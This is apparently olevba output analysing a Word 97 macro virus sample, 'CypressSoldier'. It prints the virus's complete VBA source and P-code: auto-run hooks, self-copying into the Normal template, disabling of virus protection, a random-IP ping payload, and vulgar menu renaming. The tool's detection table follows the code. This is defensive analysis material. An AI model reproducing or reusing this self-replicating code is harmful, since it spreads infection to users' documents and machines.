olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cypress
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cypress - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CypressSoldier.bas 
in file: ./Virus.MSWord.Cypress - OLE stream: 'Macros/VBA/CypressSoldier'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub payload()
On Error GoTo telos
Randomize
If Day(Now) = 30 Then
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "Creator of this virus is yozac[d0s]"
    .Heading = "WM97.CypressSoldier"
    .Animation = msoAnimationSearching
    .Show
  End With
ElseIf Day(Now) = 13 Then
MsgBox "Press OK to start death pinging randomly,hehehe", , "Pinger 666"
g = Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd)
Shell "c:\windows\ping.exe " & g & " -n 666"
With Assistant.NewBalloon
.Animation = msoAnimationSendingMail
.Icon = msoIconAlert
.Text = "yozac just finished the hell ping of " & g & ".From [d0s] with lobe"
.Heading = "Sorry infected by CypressSoldier"
.Show
End With
End If
Exit Sub
telos:
End Sub
Sub Infect()
On Error Resume Next
Dim normal As Boolean, avtive As Boolean
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(i).Name = "CypressSoldier" Then normal = True
Next
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents.Item(i).Name = "CypressSoldier" Then Active = True
Next
If normal = False And Active = True Then
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "CypressSoldier", wdOrganizerObjectProjectItems
ElseIf normal = True And Active = False Then
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "CypressSoldier", wdOrganizerObjectProjectItems
End If
End Sub
Sub AboutHelp()
On Error Resume Next
MsgBox "MicroSux Programming Error" & vbCr & "Starting formating menus...", vbCritical, "Error:Cypress Soldier inside"
Application.CommandBars(1).Name = "MicroSux"
Application.CommandBars(2).Name = "SuckMe"
Application.CommandBars.MenuAnimationStyle = msoMenuAnimationUnfold
Application.CommandBars(3).Name = "CypressSoldier"
Application.CommandBars(4).Name = "BigBang"
Application.CommandBars(5).Name = "Tits&Nipples"
Application.CommandBars(6).Name = "y0zaC-"
Application.CommandBars(7).Name = "#vir"
Application.CommandBars(8).Name = "HipHop"
Application.CommandBars(9).Name = "Kissmy dick"
Application.CommandBars.Add "Virus", , "File"
MsgBox "Don't try to beat me" & vbCr & "I am stronger than you billy", vbApplicationModal, "Bill for you"
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "cypress soldier"
    .Text = "Please leave the computer now.System is going to be deleted."
    .Animation = msoAnimationCharacterSuccessMajor
End With
End Sub
Sub AutoOpen()
On Error Resume Next
Infect
payload
ActiveDocument.Save
End Sub
Sub AutoNEw()
On Error Resume Next
Infect
payload
End Sub
Sub SaveAs()
On Error Resume Next
Infect
payload
End Sub
Sub autoclose()
On Error Resume Next
Infect
payload
End Sub
Sub ToolsMacro()
NormalTemplate.VBProject.VBComponents.Remove "CypressSoldier"
NormalTemplate.Saved = True
ActiveDocument.VBProject.VBComponents.Remove "CypressSoldier"
ActiveDocument.Saved = True
Application.ShowVisualBasicEditor = True
End Sub
Sub filetemplates()
End Sub
Sub ViewVBcode()
For t = 1 To NormalTemplate.VBProject.VBComponents.Count
 If NormalTemplate.VBProject.VBComponents.Item(t).Name = "CypressSoldier" Then
 NormalTemplate.VBProject.VBComponents.Remove "CypressSoldier"
 NormalTemplate.Saved = True
Next t
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents.Item(y).Name = "CypressSoldier" Then
ActiveDocument.VBProject.VBComponents.Remove "CypressSoldier"
ActiveDocument.Saved = True
Next y
End Sub
Sub EditPaste()
MsgBox "No data paste", vbCritical, "Word 97 Alert"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cypress
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/CypressSoldier - 7137 bytes
' Line #0:
' 	FuncDefn (Sub payload())
' Line #1:
' 	OnError telos 
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #5:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #6:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #7:
' 	LitStr 0x0023 "Creator of this virus is yozac[d0s]"
' 	MemStWith Then 
' Line #8:
' 	LitStr 0x0013 "WM97.CypressSoldier"
' 	MemStWith Heading 
' Line #9:
' 	Ld msoAnimationSearching 
' 	MemStWith Animation 
' Line #10:
' 	ArgsMemCallWith Show 0x0000 
' Line #11:
' 	EndWith 
' Line #12:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	ElseIfBlock 
' Line #13:
' 	LitStr 0x002F "Press OK to start death pinging randomly,hehehe"
' 	ParamOmitted 
' 	LitStr 0x000A "Pinger 666"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St g 
' Line #15:
' 	LitStr 0x0014 "c:\windows\ping.exe "
' 	Ld g 
' 	Concat 
' 	LitStr 0x0007 " -n 666"
' 	Concat 
' 	ArgsCall Shell 0x0001 
' Line #16:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #17:
' 	Ld msoAnimationSendingMail 
' 	MemStWith Animation 
' Line #18:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #19:
' 	LitStr 0x0025 "yozac just finished the hell ping of "
' 	Ld g 
' 	Concat 
' 	LitStr 0x0015 ".From [d0s] with lobe"
' 	Concat 
' 	MemStWith Then 
' Line #20:
' 	LitStr 0x0020 "Sorry infected by CypressSoldier"
' 	MemStWith Heading 
' Line #21:
' 	ArgsMemCallWith Show 0x0000 
' Line #22:
' 	EndWith 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	ExitSub 
' Line #25:
' 	Label telos 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub Infect())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	Dim 
' 	VarDefn normal (As Boolean)
' 	VarDefn avtive (As Boolean)
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #32:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #34:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #36:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000E "CypressSoldier"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St normal 
' 	EndIf 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #39:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000E "CypressSoldier"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Active 
' 	EndIf 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	Ld normal 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Active 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #42:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x000E "CypressSoldier"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #43:
' 	Ld normal 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Active 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x000E "CypressSoldier"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub AboutHelp())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	LitStr 0x001A "MicroSux Programming Error"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001B "Starting formating menus..."
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001C "Error:Cypress Soldier inside"
' 	ArgsCall MsgBox 0x0003 
' Line #50:
' 	LitStr 0x0008 "MicroSux"
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #51:
' 	LitStr 0x0006 "SuckMe"
' 	LitDI2 0x0002 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #52:
' 	Ld msoMenuAnimationUnfold 
' 	Ld Application 
' 	MemLd CommandBars 
' 	MemSt MenuAnimationStyle 
' Line #53:
' 	LitStr 0x000E "CypressSoldier"
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #54:
' 	LitStr 0x0007 "BigBang"
' 	LitDI2 0x0004 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #55:
' 	LitStr 0x000C "Tits&Nipples"
' 	LitDI2 0x0005 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #56:
' 	LitStr 0x0006 "y0zaC-"
' 	LitDI2 0x0006 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #57:
' 	LitStr 0x0004 "#vir"
' 	LitDI2 0x0007 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #58:
' 	LitStr 0x0006 "HipHop"
' 	LitDI2 0x0008 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #59:
' 	LitStr 0x000B "Kissmy dick"
' 	LitDI2 0x0009 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt New 
' Line #60:
' 	LitStr 0x0005 "Virus"
' 	ParamOmitted 
' 	LitStr 0x0004 "File"
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemCall Add 0x0003 
' Line #61:
' 	LitStr 0x0014 "Don't try to beat me"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001C "I am stronger than you billy"
' 	Concat 
' 	Ld vbApplicationModal 
' 	LitStr 0x000C "Bill for you"
' 	ArgsCall MsgBox 0x0003 
' Line #62:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #63:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #64:
' 	LitStr 0x000F "cypress soldier"
' 	MemStWith Heading 
' Line #65:
' 	LitStr 0x003C "Please leave the computer now.System is going to be deleted."
' 	MemStWith Then 
' Line #66:
' 	Ld msoAnimationCharacterSuccessMajor 
' 	MemStWith Animation 
' Line #67:
' 	EndWith 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub AutoOpen())
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	ArgsCall Infect 0x0000 
' Line #72:
' 	ArgsCall payload 0x0000 
' Line #73:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub AutoNEw())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	ArgsCall Infect 0x0000 
' Line #78:
' 	ArgsCall payload 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub SaveAs())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	ArgsCall Infect 0x0000 
' Line #83:
' 	ArgsCall payload 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub autoclose())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	ArgsCall Infect 0x0000 
' Line #88:
' 	ArgsCall payload 0x0000 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub ToolsMacro())
' Line #91:
' 	LitStr 0x000E "CypressSoldier"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #93:
' 	LitStr 0x000E "CypressSoldier"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #94:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #95:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub filetemplates())
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub ViewVBcode())
' Line #100:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #101:
' 	Ld t 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000E "CypressSoldier"
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitStr 0x000E "CypressSoldier"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #103:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #104:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #106:
' 	Ld y 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000E "CypressSoldier"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitStr 0x000E "CypressSoldier"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #108:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #109:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub EditPaste())
' Line #112:
' 	LitStr 0x000D "No data paste"
' 	Ld vbCritical 
' 	LitStr 0x000D "Word 97 Alert"
' 	ArgsCall MsgBox 0x0003 
' Line #113:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |AutoNEw             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ping.exe            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

